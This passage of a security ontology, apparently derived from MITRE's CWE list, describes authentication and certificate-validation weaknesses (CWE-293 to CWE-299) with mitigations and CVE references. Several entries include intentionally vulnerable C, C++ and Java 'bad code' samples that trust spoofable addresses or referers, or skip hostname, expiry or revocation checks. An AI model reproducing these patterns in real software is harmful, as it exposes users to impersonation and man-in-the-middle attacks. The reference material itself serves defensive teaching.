                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Both of these examples check if a request is from a trusted address before responding to the request.

(bad code)
Example Language: C 
sd = socket(AF_INET, SOCK_DGRAM, 0);
serv.sin_family = AF_INET;
serv.sin_addr.s_addr = htonl(INADDR_ANY);
servr.sin_port = htons(1008);
bind(sd, (struct sockaddr *) & serv, sizeof(serv));

while (1) {
memset(msg, 0x0, MAX_MSG);
clilen = sizeof(cli);
if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) {
n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) & cli, &clilen);
}
}
(bad code)
Example Language: Java 
while(true) {
DatagramPacket rp=new DatagramPacket(rData,rData.length);
outSock.receive(rp);
String in = new String(p.getData(),0, rp.getLength());
InetAddress clientIPAddress = rp.getAddress();
int port = rp.getPort();

if (isTrustedAddress(clientIPAddress) & secretKey.equals(in)) {
out = secret.getBytes();
DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp);
}
}
The code only verifies the address as stored in the request packet. An attacker can spoof this address, thus impersonating a trusted client."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     non-repudiation  "Gain Privileges or Assume Identity"^^xsd:string,
     non-repudiation  "Hide Activities"^^xsd:string,
     weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-293_Using_Referer_Field_for_Authentication

    Annotations: 
        rdfs:comment "The referer field in HTTP requests can be easily modified and, as such, is not a valid means of message integrity checking."^^xsd:string,
        rdfs:comment "referrer:	
While the proper spelling might be regarded as \"referrer,\" the HTTP RFCs and their implementations use \"referer,\" so this is regarded as the correct spelling."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     ID  "293"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "In order to usefully check if a given action is authorized, some means of strong authentication and method protection must be used. Use other means of authorization that cannot be simply spoofed. Possibilities include a username/password or certificate."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "Actions, which may not be authorized otherwise, can be carried out as if they were validated by the server referred to."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following code samples check a packet's referer in order to decide whether or not an inbound request is from a trusted host.

(bad code)
Example Language: C++ 
String trustedReferer = \"http://www.example.com/\"
while(true){
n = read(newsock, buffer, BUFSIZE);
requestPacket = processPacket(buffer, n);
if (requestPacket.referer == trustedReferer){
openNewSecureSession(requestPacket);
}
}
(bad code)
Example Language: Java 
boolean processConnectionRequest(HttpServletRequest request){
String referer = request.getHeader(\"referer\")
String trustedReferer = \"http://www.example.com/\"
if(referer.equals(trustedReferer)){
openPrivilegedConnection(request);
return true;
}
else{
sendPrivilegeError(request);
return false;
}
}
These examples check if a request is from a trusted referer before responding to a request, but the code only verifies the referer name as stored in the request packet. An attacker can spoof the referer, thus impersonating a trusted client."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-294_Authentication_Bypass_by_Capture-replay

    Annotations: 
        rdfs:comment "A capture-replay flaw exists when the design of the software makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes)."^^xsd:string,
        rdfs:comment "Capture-replay attacks are common and can be difficult to defeat without cryptography. They are a subset of network injection attacks that rely on observing previously-sent valid commands, then changing them slightly if necessary and resending the same commands to the server."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2005-3435,
     references  CVE-2007-4961,
     related_attack_patterns  CAPEC-102,
     related_attack_patterns  CAPEC-60,
     related_attack_patterns  CAPEC-94,
     ID  "294"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Messages sent with a capture-relay attack allow access to resources which are not otherwise accessible without proper authentication."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Since any attacker who can listen to traffic can see sequence numbers, it is necessary to sign messages with some kind of cryptography to ensure that sequence numbers are not simply doctored along with content."^^xsd:string, 
                 rdfs:comment "Utilize some sequence or time stamping functionality along with a checksum which takes this into account in order to ensure that messages can be parsed only once."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-295_Improper_Certificate_Validation

    Annotations: 
        rdfs:comment "Background Details:
A certificate is a token that associates an identity (principal) to a cryptographic key. Certificates can be used to check if a public key belongs to the assumed owner."^^xsd:string,
        rdfs:comment "The software does not validate, or incorrectly validates, a certificate."^^xsd:string,
        rdfs:comment "When a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by using a man-in-the-middle (MITM) attack. The software might connect to a malicious host while believing it is a trusted host, or the software might be deceived into accepting spoofed data that appears to originate from a trusted host."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "Cryptographic API, as used in web browsers, mail clients, and other software, does not properly validate Basic Constraints."^^xsd:string
                 
                 references  CVE-2002-0862,
     
     Annotations: rdfs:comment "chain: product checks if client is trusted when it intended to check if the server is trusted, allowing validation of signed code."^^xsd:string
                 
                 references  CVE-2003-1229,
     
     Annotations: rdfs:comment "LDAP client accepts certificates even if they are not from a trusted CA."^^xsd:string
                 
                 references  CVE-2005-3170,
     
     Annotations: rdfs:comment "Verification function trusts certificate chains in which the last certificate is self-signed."^^xsd:string
                 
                 references  CVE-2008-4989,
     
     Annotations: rdfs:comment "chain: DNS server does not correctly check return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain."^^xsd:string
                 
                 references  CVE-2009-0265,
     
     Annotations: rdfs:comment "chain: OS package manager does not check properly check the return value, allowing bypass using a revoked certificate."^^xsd:string
                 
                 references  CVE-2009-1358,
     
     Annotations: rdfs:comment "Web browser does not correctly handle '\\0' character (NUL) in Common Name, allowing spoofing of https sites."^^xsd:string
                 
                 references  CVE-2009-2408,
     
     Annotations: rdfs:comment "Web browser does not check if any intermediate certificates are revoked."^^xsd:string
                 
                 references  CVE-2009-3046,
     
     Annotations: rdfs:comment "chain: incorrect calculation allows attackers to bypass certificate checks."^^xsd:string
                 
                 references  CVE-2010-1378,
     
     Annotations: rdfs:comment "Operating system does not check Certificate Revocation List (CRL) in some cases, allowing spoofing using a revoked certificate."^^xsd:string
                 
                 references  CVE-2011-0199,
     
     Annotations: rdfs:comment "Smartphone device does not verify hostname, allowing spoofing of mail services."^^xsd:string
                 
                 references  CVE-2012-2993,
     
     Annotations: rdfs:comment "Cloud-support library written in Python uses incorrect regular expression when matching hostname."^^xsd:string
                 
                 references  CVE-2012-3446,
     
     Annotations: rdfs:comment "Mobile banking application does not verify hostname, leading to financial loss."^^xsd:string
                 
                 references  CVE-2012-5810,
     
     Annotations: rdfs:comment "Java library uses JSSE SSLSocket and SSLEngine classes, which do not verify the hostname."^^xsd:string
                 
                 references  CVE-2012-5817,
     
     Annotations: rdfs:comment "Cloud storage management application does not validate hostname."^^xsd:string
                 
                 references  CVE-2012-5819,
     
     Annotations: rdfs:comment "Web browser uses a TLS-related function incorrectly, preventing it from verifying that a server's certificate is signed by a trusted certification authority (CA)"^^xsd:string
                 
                 references  CVE-2012-5821,
     
     Annotations: rdfs:comment "Application uses third-party library that does not validate hostname."^^xsd:string
                 
                 references  CVE-2012-5822,
     
     Annotations: rdfs:comment "chain: incorrect \"goto\" in Apple SSL product bypasses certificate validation, allowing man-in-the-middle attack (Apple \"goto fail\" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint ('Man-in-the-Middle'))."^^xsd:string
                 
                 references  CVE-2014-1266,
     
     Annotations: rdfs:comment "Creating a Rogue Certification Authority Certificate"^^xsd:string
                 
                 related_attack_patterns  CAPEC-459,
     ID  "295"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Certificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     authentication  "Bypass Protection Mechanism"^^xsd:string,
     authentication  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Web Application Scanner
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation:
According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Man-in-the-middle attack tool
Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Certificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key."^^xsd:string, 
                 rdfs:comment "If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     paradigms  "Mobile"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code:
According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Focused Manual Spotcheck - Focused manual analysis of source
Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-297_Improper_Validation_of_Certificate_with_Host_Mismatch

    Annotations: 
        rdfs:comment "Even if a certificate is well-formed, signed, and follows the chain of trust, it may simply be a valid certificate for a different site than the site that the software is interacting with. If the certificate's host-specific data is not properly checked - such as the Common Name (CN) in the Subject or the Subject Alternative Name (SAN) extension of an X.509 certificate - it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data, impersonating a trusted host. In order to ensure data integrity, the certificate must be valid and it must pertain to the site that is being accessed.

Even if the software attempts to check the hostname, it is still possible to incorrectly check the hostname. For example, attackers could create a certificate with a name that begins with a trusted name followed by a NUL byte, which could cause some string-based comparisons to only examine the portion that contains the trusted name.

This weakness can occur even when the software uses Certificate Pinning, if the software does not verify the hostname at the time a certificate is pinned."^^xsd:string,
        rdfs:comment "The software communicates with a host that provides a certificate, but the software does not properly ensure that the certificate is actually associated with that host."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "Web browser does not validate Common Name, allowing spoofing of https sites."^^xsd:string
                 
                 references  CVE-2003-0355,
     
     Annotations: rdfs:comment "Web browser does not correctly handle '\\0' character (NUL) in Common Name, allowing spoofing of https sites."^^xsd:string
                 
                 references  CVE-2009-2408,
     
     Annotations: rdfs:comment "LDAP server's incorrect handling of '\\0' character (NUL) in hostname verification allows spoofing."^^xsd:string
                 
                 references  CVE-2009-3767,
     
     Annotations: rdfs:comment "Mail server's incorrect handling of '\\0' character (NUL) in hostname verification allows spoofing."^^xsd:string
                 
                 references  CVE-2009-4565,
     
     Annotations: rdfs:comment "Incorrect handling of '\\0' character (NUL) in hostname verification allows spoofing."^^xsd:string
                 
                 references  CVE-2010-2074,
     
     Annotations: rdfs:comment "Database program truncates the Common Name during hostname verification, allowing spoofing."^^xsd:string
                 
                 references  CVE-2012-0867,
     
     Annotations: rdfs:comment "Smartphone device does not verify hostname, allowing spoofing of mail services."^^xsd:string
                 
                 references  CVE-2012-2993,
     
     Annotations: rdfs:comment "Cloud-support library written in Python uses incorrect regular expression when matching hostname."^^xsd:string
                 
                 references  CVE-2012-3446,
     
     Annotations: rdfs:comment "Merchant SDK for payments does not verify the hostname."^^xsd:string
                 
                 references  CVE-2012-5780,
     
     Annotations: rdfs:comment "PHP library for payments does not verify the hostname."^^xsd:string
                 
                 references  CVE-2012-5782,
     
     Annotations: rdfs:comment "SOAP platform does not verify the hostname."^^xsd:string
                 
                 references  CVE-2012-5784,
     
     Annotations: rdfs:comment "E-commerce module does not verify hostname when connecting to payment site."^^xsd:string
                 
                 references  CVE-2012-5804,
     
     Annotations: rdfs:comment "Payment processing module does not verify hostname when connecting to PayPal using PHP fsockopen function."^^xsd:string
                 
                 references  CVE-2012-5806,
     
     Annotations: rdfs:comment "Software for electronic checking does not verify hostname, leading to financial loss."^^xsd:string
                 
                 references  CVE-2012-5807,
     
     Annotations: rdfs:comment "Mobile banking application does not verify hostname, leading to financial loss."^^xsd:string
                 
                 references  CVE-2012-5810,
     
     Annotations: rdfs:comment "Mobile application for printing documents does not verify hostname, allowing attackers to read sensitive documents."^^xsd:string
                 
                 references  CVE-2012-5811,
     
     Annotations: rdfs:comment "Java library uses JSSE SSLSocket and SSLEngine classes, which do not verify the hostname."^^xsd:string
                 
                 references  CVE-2012-5817,
     
     Annotations: rdfs:comment "Cloud storage management application does not validate hostname."^^xsd:string
                 
                 references  CVE-2012-5819,
     
     Annotations: rdfs:comment "Application uses third-party library that does not validate hostname."^^xsd:string
                 
                 references  CVE-2012-5822,
     
     Annotations: rdfs:comment "Chat application does not validate hostname, leading to loss of privacy."^^xsd:string
                 
                 references  CVE-2012-5824,
     ID  "297"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The data read from the system vouched for by the certificate may not be from the expected system."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Fully check the hostname of the certificate and provide the user with adequate information about the nature of the problem and how to proceed."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Trust afforded to the system in question - based on the malicious certificate - may allow for spoofing or redirection attacks."^^xsd:string
                 
                 authentication  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following OpenSSL code obtains a certificate and verifies it.

Example Language: C  /* (bad code) */
cert = SSL_get_peer_certificate(ssl);
if (cert && (SSL_get_verify_result(ssl)==X509_V_OK)) {

// do secret things 
}
Even though the \"verify\" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "When Certificate Pinning is being used in a mobile application, consider using a tool such as Spinner [REF-955]. This methodology might be extensible to other technologies."^^xsd:string
                 
                 dynamic  "black box"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation:
Set up an untrusted endpoint (e.g. a server) with which the software will connect. Create a test certificate that uses an invalid hostname but is signed by a trusted CA and provide this certificate from the untrusted endpoint. If the software performs any operations instead of disconnecting and reporting an error, then this indicates that the hostname is not being checked and the test certificate has been accepted."^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname."^^xsd:string, 
                 rdfs:comment "When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Trust afforded to the system in question - based on the malicious certificate - may allow for spoofing or redirection attacks."^^xsd:string
                 
                 other  "Other"^^xsd:string,
     paradigms  "Mobile"^^xsd:string
    
    
Individual: CWE-298_Improper_Validation_of_Certificate_Expiration

    Annotations: 
        rdfs:comment "A certificate expiration is not validated or is incorrectly validated, so trust may be assigned to certificates that have been abandoned due to age."^^xsd:string,
        rdfs:comment "When the expiration of a certificate is not taken into account, no trust has necessarily been conveyed through it. Therefore, the validity of the certificate cannot be verified and all benefit of the certificate is lost."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     ID  "298"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Check for expired certificates and provide the user with adequate information about the nature of the problem and how to proceed."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Trust afforded to the system in question - based on the expired certificate - may allow for spoofing attacks."^^xsd:string
                 
                 authentication  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following OpenSSL code ensures that there is a certificate and allows the use of expired certificates.

Example Language: C  /* (bad code) */
if (cert = SSL_get_peer(certificate(ssl)) {
foo=SSL_get_verify_result(ssl);
if ((X509_V_OK==foo) || (X509_V_ERR_CERT_HAS_EXPIRED==foo))

//do stuff 
If the call to SSL_get_verify_result() returns X509_V_ERR_CERT_HAS_EXPIRED, this means that the certificate has expired. As time goes on, there is an increasing chance for attackers to compromise the certificate."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the expiration."^^xsd:string, 
                 rdfs:comment "When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The data read from the system vouched for by the expired certificate may be flawed due to malicious spoofing."^^xsd:string
                 
                 integrity  "Other"^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "The data read from the system vouched for by the expired certificate may be flawed due to malicious spoofing."^^xsd:string, 
                 rdfs:comment "Trust afforded to the system in question - based on the expired certificate - may allow for spoofing attacks."^^xsd:string
                 
                 other  "Other"^^xsd:string
    
    
Individual: CWE-299_Improper_Check_for_Certificate_Revocation

    Annotations: 
        rdfs:comment "An improper check for certificate revocation is a far more serious flaw than related certificate failures. This is because the use of any revoked certificate is almost certainly malicious. The most common reason for certificate revocation is compromise of the system in question, with the result that no legitimate servers will be using a revoked certificate, unless they are sorely out of sync."^^xsd:string,
        rdfs:comment "The software does not check or incorrectly checks the revocation status of a certificate, which may cause it to use a certificate that has been compromised."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "Product cannot access certificate revocation list when an HTTP proxy is being used."^^xsd:string
                 
                 references  CVE-2006-4409,
     
     Annotations: rdfs:comment "Certificate revocation list not searched for certain certificates."^^xsd:string
                 
                 references  CVE-2006-4410,
     
     Annotations: rdfs:comment "chain: web service component does not call the expected method, which prevents a check for revoked certificates."^^xsd:string
                 
                 references  CVE-2008-4679,
     
     Annotations: rdfs:comment "chain: Ruby module for OCSP misinterprets a response, preventing detection of a revoked certificate."^^xsd:string
                 
                 references  CVE-2009-0161,
     
     Annotations: rdfs:comment "chain: language interpreter does not properly check the return value from an OSCP function, allowing bypass using a revoked certificate."^^xsd:string
                 
                 references  CVE-2009-0642,
     
     Annotations: rdfs:comment "chain: OS package manager does not properly check the return value, allowing bypass using a revoked certificate."^^xsd:string
                 
                 references  CVE-2009-1358,
     
     Annotations: rdfs:comment "Web browser does not check if any intermediate certificates are revoked."^^xsd:string
                 
                 references  CVE-2009-3046,
     
     Annotations: rdfs:comment "Antivirus product does not check whether certificates from signed executables have been revoked."^^xsd:string
                 
                 references  CVE-2010-5185,
     
     Annotations: rdfs:comment "Operating system does not check Certificate Revocation List (CRL) in some cases, allowing spoofing using a revoked certificate."^^xsd:string
                 
                 references  CVE-2011-0199,
     
     Annotations: rdfs:comment "Router can permanently cache certain public keys, which would allow bypass if the certificate is later revoked."^^xsd:string
                 
                 references  CVE-2011-0935,
     
     Annotations: rdfs:comment "LDAP-over-SSL implementation does not check Certificate Revocation List (CRL), allowing spoofing using a revoked certificate."^^xsd:string
                 
                 references  CVE-2011-2014,
     
     Annotations: rdfs:comment "chain: incorrect parsing of replies from OCSP responders allows bypass using a revoked certificate."^^xsd:string
                 
                 references  CVE-2011-2701,
     ID  "299"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Trust may be assigned to an entity who is not who it claims to be."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that certificates are checked for revoked status."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Data may be disclosed to an entity impersonating a trusted entity, resulting in information disclosure."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The following OpenSSL code ensures that there is a certificate before continuing execution.

Example Language: C  /* (bad code) */
if (cert = SSL_get_peer_certificate(ssl)) {

// got a certificate, do secret things 
Because this code does not use SSL_get_verify_results() to check the certificate, it could accept certificates that have been revoked (X509_V_ERR_CERT_REVOKED). The software could be communicating with a malicious host."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the revoked status."^^xsd:string, 
                 rdfs:comment "When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Data from an untrusted (and possibly malicious) source may be integrated."^^xsd:string
                 
                 integrity  "Other"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Data from an untrusted (and possibly malicious) source may be integrated."^^xsd:string
                 
                 other  "Other"^^xsd:string
    
    
Individual: CWE-300_Channel_Accessible_by_Non-Endpoint

    Annotations: 
